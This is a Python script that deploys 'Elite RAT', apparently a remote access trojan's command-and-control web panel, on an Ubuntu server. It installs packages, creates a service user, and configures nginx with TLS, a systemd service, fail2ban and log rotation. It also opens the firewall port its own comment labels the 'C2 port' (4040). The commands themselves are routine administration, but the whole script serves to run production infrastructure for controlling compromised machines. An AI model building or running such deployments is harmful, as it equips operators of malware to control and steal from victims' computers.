#!/usr/bin/env python3
"""
Elite RAT Production Deployment Script for Ubuntu Server
Handles all deployment tasks including dependency installation, configuration, and service setup.
"""

import os
import sys
import subprocess
import shutil
import socket
import time
import pwd
import grp
from pathlib import Path

class UbuntuDeployer:
    def __init__(self):
        self.workspace = Path("/workspace")
        self.service_name = "elite-rat"
        self.service_user = "elite-rat"
        self.service_group = "elite-rat"
        self.install_dir = Path("/opt/elite-rat")
        self.log_dir = Path("/var/log/elite-rat")
        self.data_dir = Path("/var/lib/elite-rat")
        self.config_dir = Path("/etc/elite-rat")
        
    def run_command(self, cmd, check=True, shell=False):
        """Run a system command with error handling"""
        try:
            if shell:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check)
            else:
                result = subprocess.run(cmd.split(), capture_output=True, text=True, check=check)
            return result.stdout.strip(), result.stderr.strip()
        except subprocess.CalledProcessError as e:
            print(f"❌ Command failed: {cmd}")
            print(f"   Error: {e.stderr}")
            if check:
                sys.exit(1)
            return "", e.stderr
    
    def check_root(self):
        """Ensure script is run as root"""
        if os.geteuid() != 0:
            print("❌ This script must be run as root (use sudo)")
            sys.exit(1)
        print("✅ Running as root")
    
    def check_ubuntu(self):
        """Verify we're on Ubuntu"""
        try:
            with open('/etc/os-release', 'r') as f:
                content = f.read()
                if 'Ubuntu' not in content:
                    print("⚠️  Warning: This script is designed for Ubuntu")
                else:
                    print("✅ Ubuntu detected")
        except FileNotFoundError:
            print("⚠️  Warning: Cannot detect OS version")
    
    def update_system(self):
        """Update system packages"""
        print("📦 Updating system packages...")
        self.run_command("apt update")
        self.run_command("apt upgrade -y")
        print("✅ System updated")
    
    def install_system_dependencies(self):
        """Install required system packages"""
        print("📦 Installing system dependencies...")
        packages = [
            "python3", "python3-pip", "python3-venv", "python3-dev",
            "build-essential", "libssl-dev", "libffi-dev", "libxml2-dev", 
            "libxslt1-dev", "zlib1g-dev", "libjpeg-dev", "libpng-dev",
            "nginx", "supervisor", "ufw", "fail2ban", "logrotate",
            "sqlite3", "redis-server", "htop", "curl", "wget", "git"
        ]
        
        for package in packages:
            print(f"   Installing {package}...")
            self.run_command(f"apt install -y {package}")
        
        print("✅ System dependencies installed")
    
    def create_service_user(self):
        """Create dedicated service user"""
        print(f"👤 Creating service user: {self.service_user}")
        
        # Create group
        try:
            grp.getgrnam(self.service_group)
            print(f"   Group {self.service_group} already exists")
        except KeyError:
            self.run_command(f"groupadd --system {self.service_group}")
            print(f"   Created group: {self.service_group}")
        
        # Create user
        try:
            pwd.getpwnam(self.service_user)
            print(f"   User {self.service_user} already exists")
        except KeyError:
            self.run_command(f"useradd --system --gid {self.service_group} --shell /bin/false --home-dir {self.install_dir} --create-home {self.service_user}")
            print(f"   Created user: {self.service_user}")
        
        print("✅ Service user configured")
    
    def create_directories(self):
        """Create required directories with proper permissions"""
        print("📁 Creating directories...")
        
        directories = [
            (self.install_dir, 0o755, self.service_user, self.service_group),
            (self.log_dir, 0o755, self.service_user, self.service_group),
            (self.data_dir, 0o750, self.service_user, self.service_group),
            (self.config_dir, 0o750, "root", self.service_group),
            (Path("/var/run/elite-rat"), 0o755, self.service_user, self.service_group),
        ]
        
        for dir_path, mode, owner, group in directories:
            dir_path.mkdir(parents=True, exist_ok=True)
            shutil.chown(dir_path, owner, group)
            os.chmod(dir_path, mode)
            print(f"   Created: {dir_path} ({oct(mode)}, {owner}:{group})")
        
        print("✅ Directories created")
    
    def install_application(self):
        """Install application files"""
        print("📋 Installing application files...")
        
        # Copy application files
        app_files = [
            "web_app_real.py", "config.py", "start_server.py",
            "auth_utils.py", "web_app_enhancements.py", "ssl_utils.py",
            "native_protocol_bridge.py", "websocket_extensions.py",
            "requirements_production.txt"
        ]
        
        for file in app_files:
            src = self.workspace / file
            if src.exists():
                dst = self.install_dir / file
                shutil.copy2(src, dst)
                shutil.chown(dst, self.service_user, self.service_group)
                os.chmod(dst, 0o644)
                print(f"   Copied: {file}")
        
        # Copy directories
        app_dirs = ["Application", "Core", "Configuration", "templates", "static"]
        for dir_name in app_dirs:
            src_dir = self.workspace / dir_name
            if src_dir.exists():
                dst_dir = self.install_dir / dir_name
                if dst_dir.exists():
                    shutil.rmtree(dst_dir)
                shutil.copytree(src_dir, dst_dir)
                self.run_command(f"chown -R {self.service_user}:{self.service_group} {dst_dir}")
                print(f"   Copied directory: {dir_name}")
        
        print("✅ Application files installed")
    
    def setup_python_environment(self):
        """Set up Python virtual environment"""
        print("🐍 Setting up Python environment...")
        
        venv_path = self.install_dir / "venv"
        
        # Create virtual environment
        self.run_command(f"python3 -m venv {venv_path}")
        
        # Install requirements
        pip_path = venv_path / "bin" / "pip"
        requirements_path = self.install_dir / "requirements_production.txt"
        
        if requirements_path.exists():
            self.run_command(f"{pip_path} install --upgrade pip")
            self.run_command(f"{pip_path} install -r {requirements_path}")
        
        # Set ownership
        self.run_command(f"chown -R {self.service_user}:{self.service_group} {venv_path}")
        
        print("✅ Python environment configured")
    
    def configure_nginx(self):
        """Configure Nginx reverse proxy"""
        print("🌐 Configuring Nginx...")
        
        nginx_config = f"""
server {{
    listen 80;
    listen [::]:80;
    server_name _;
    
    # Redirect HTTP to HTTPS
    return 301 https://$server_name$request_uri;
}}

server {{
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name _;
    
    # SSL Configuration
    ssl_certificate /etc/nginx/ssl/elite-rat.crt;
    ssl_certificate_key /etc/nginx/ssl/elite-rat.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    
    # Security headers
    add_header Strict-Transport-Security "max-age=63072000" always;
    add_header X-Frame-Options DENY always;
    add_header X-Content-Type-Options nosniff always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # Rate limiting
    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
    limit_req_zone $binary_remote_addr zone=api:10m rate=30r/m;
    
    location / {{
        proxy_pass http://127.0.0.1:5000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }}
    
    location /socket.io/ {{
        proxy_pass http://127.0.0.1:5000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }}
    
    location /login {{
        limit_req zone=login burst=3 nodelay;
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }}
    
    location /api/ {{
        limit_req zone=api burst=10 nodelay;
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }}
}}
"""
        
        # Write Nginx configuration
        nginx_config_path = Path("/etc/nginx/sites-available/elite-rat")
        with open(nginx_config_path, 'w') as f:
            f.write(nginx_config)
        
        # Enable site
        nginx_enabled_path = Path("/etc/nginx/sites-enabled/elite-rat")
        if nginx_enabled_path.exists():
            nginx_enabled_path.unlink()
        nginx_enabled_path.symlink_to(nginx_config_path)
        
        # Remove default site
        default_site = Path("/etc/nginx/sites-enabled/default")
        if default_site.exists():
            default_site.unlink()
        
        # Create SSL directory and generate self-signed certificate
        ssl_dir = Path("/etc/nginx/ssl")
        ssl_dir.mkdir(exist_ok=True)
        
        cert_path = ssl_dir / "elite-rat.crt"
        key_path = ssl_dir / "elite-rat.key"
        
        if not cert_path.exists():
            self.run_command(f"openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout {key_path} -out {cert_path} -subj '/C=US/ST=State/L=City/O=Elite RAT/CN=localhost'")
            print("   Generated self-signed SSL certificate")
        
        # Test and reload Nginx
        self.run_command("nginx -t")
        self.run_command("systemctl reload nginx")
        
        print("✅ Nginx configured")
    
    def create_systemd_service(self):
        """Create systemd service file"""
        print("⚙️  Creating systemd service...")
        
        service_content = f"""[Unit]
Description=Elite RAT Web Application
After=network.target
Wants=network.target

[Service]
Type=simple
User={self.service_user}
Group={self.service_group}
WorkingDirectory={self.install_dir}
Environment=PATH={self.install_dir}/venv/bin
EnvironmentFile=/etc/elite-rat/production.env
ExecStart={self.install_dir}/venv/bin/python web_app_real.py
ExecReload=/bin/kill -HUP $MAINPID
KillMode=mixed
TimeoutStopSec=5
PrivateTmp=true
Restart=always
RestartSec=10

# Security settings
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths={self.log_dir} {self.data_dir} {self.install_dir}/Application {self.install_dir}/uploads {self.install_dir}/downloads
ProtectKernelTunables=true
ProtectKernelModules=true
ProtectControlGroups=true
RestrictRealtime=true
RestrictSUIDSGID=true

[Install]
WantedBy=multi-user.target
"""
        
        service_path = Path(f"/etc/systemd/system/{self.service_name}.service")
        with open(service_path, 'w') as f:
            f.write(service_content)
        
        # Reload systemd and enable service
        self.run_command("systemctl daemon-reload")
        self.run_command(f"systemctl enable {self.service_name}")
        
        print("✅ Systemd service created")
    
    def configure_firewall(self):
        """Configure UFW firewall"""
        print("🔥 Configuring firewall...")
        
        # Enable UFW
        self.run_command("ufw --force enable")
        
        # Allow SSH (be careful!)
        self.run_command("ufw allow 22/tcp")
        
        # Allow HTTP and HTTPS
        self.run_command("ufw allow 80/tcp")
        self.run_command("ufw allow 443/tcp")
        
        # Allow C2 port (be very careful with this!)
        self.run_command("ufw allow 4040/tcp")
        
        # Show status
        stdout, _ = self.run_command("ufw status")
        print(f"   Firewall status:\n{stdout}")
        
        print("✅ Firewall configured")
    
    def configure_fail2ban(self):
        """Configure Fail2Ban for additional security"""
        print("🛡️  Configuring Fail2Ban...")
        
        # Create custom jail for Elite RAT
        jail_config = """[elite-rat]
enabled = true
port = 80,443
filter = elite-rat
logpath = /var/log/elite-rat/web.log
maxretry = 3
bantime = 3600
findtime = 600
"""
        
        with open("/etc/fail2ban/jail.d/elite-rat.conf", 'w') as f:
            f.write(jail_config)
        
        # Create filter
        filter_config = """[Definition]
failregex = ^.*Failed login attempt from <HOST>.*$
            ^.*Suspicious activity from <HOST>.*$
ignoreregex =
"""
        
        with open("/etc/fail2ban/filter.d/elite-rat.conf", 'w') as f:
            f.write(filter_config)
        
        # Restart Fail2Ban
        self.run_command("systemctl restart fail2ban")
        
        print("✅ Fail2Ban configured")
    
    def setup_logging(self):
        """Configure log rotation"""
        print("📝 Setting up log rotation...")
        
        logrotate_config = f"""{self.log_dir}/*.log {{
    daily
    missingok
    rotate 30
    compress
    delaycompress
    notifempty
    create 644 {self.service_user} {self.service_group}
    postrotate
        systemctl reload {self.service_name} > /dev/null 2>&1 || true
    endscript
}}
"""
        
        with open(f"/etc/logrotate.d/{self.service_name}", 'w') as f:
            f.write(logrotate_config)
        
        print("✅ Log rotation configured")
    
    def create_production_config(self):
        """Create production environment configuration"""
        print("⚙️  Creating production configuration...")
        
        env_file = self.config_dir / "production.env"
        
        # Copy template if it doesn't exist
        if not env_file.exists():
            template_path = self.workspace / ".env.production"
            if template_path.exists():
                shutil.copy2(template_path, env_file)
            else:
                # Create minimal config
                with open(env_file, 'w') as f:
                    f.write(f"""# Elite RAT Production Configuration
STITCH_ADMIN_USER=admin
STITCH_ADMIN_PASSWORD=CHANGE_THIS_NOW!
STITCH_SECRET_KEY={os.urandom(32).hex()}
STITCH_HOST=127.0.0.1
STITCH_PORT=5000
STITCH_DEBUG=false
STITCH_ENABLE_HTTPS=false
STITCH_LOG_LEVEL=INFO
STITCH_ENABLE_FILE_LOGGING=true
""")
        
        # Set secure permissions
        os.chmod(env_file, 0o640)
        shutil.chown(env_file, "root", self.service_group)
        
        print(f"✅ Configuration created at {env_file}")
        print("⚠️  IMPORTANT: Edit this file to set secure passwords!")
    
    def check_ports(self):
        """Check if required ports are available"""
        print("🔍 Checking port availability...")
        
        ports_to_check = [80, 443, 5000, 4040]
        
        for port in ports_to_check:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', port))
            sock.close()
            
            if result == 0:
                print(f"   ⚠️  Port {port} is in use")
            else:
                print(f"   ✅ Port {port} is available")
    
    def deploy(self):
        """Run full deployment"""
        print("🚀 Starting Elite RAT deployment on Ubuntu Server...")
        print("=" * 60)
        
        try:
            self.check_root()
            self.check_ubuntu()
            self.check_ports()
            self.update_system()
            self.install_system_dependencies()
            self.create_service_user()
            self.create_directories()
            self.install_application()
            self.setup_python_environment()
            self.create_production_config()
            self.create_systemd_service()
            self.configure_nginx()
            self.configure_firewall()
            self.configure_fail2ban()
            self.setup_logging()
            
            print("\n" + "=" * 60)
            print("🎉 Deployment completed successfully!")
            print("=" * 60)
            print("\n📋 Next steps:")
            print(f"1. Edit configuration: sudo nano {self.config_dir}/production.env")
            print("2. Set secure admin password in the config file")
            print(f"3. Start the service: sudo systemctl start {self.service_name}")
            print(f"4. Check status: sudo systemctl status {self.service_name}")
            print("5. View logs: sudo journalctl -u elite-rat -f")
            print("6. Access web interface: https://your-server-ip")
            print("\n⚠️  SECURITY REMINDERS:")
            print("- Change default passwords immediately")
            print("- Configure proper SSL certificates")
            print("- Review firewall rules")
            print("- Monitor logs regularly")
            print("- Keep system updated")
            
        except Exception as e:
            print(f"\n❌ Deployment failed: {e}")
            import traceback
            traceback.print_exc()
            sys.exit(1)

if __name__ == "__main__":
    deployer = UbuntuDeployer()
    deployer.deploy()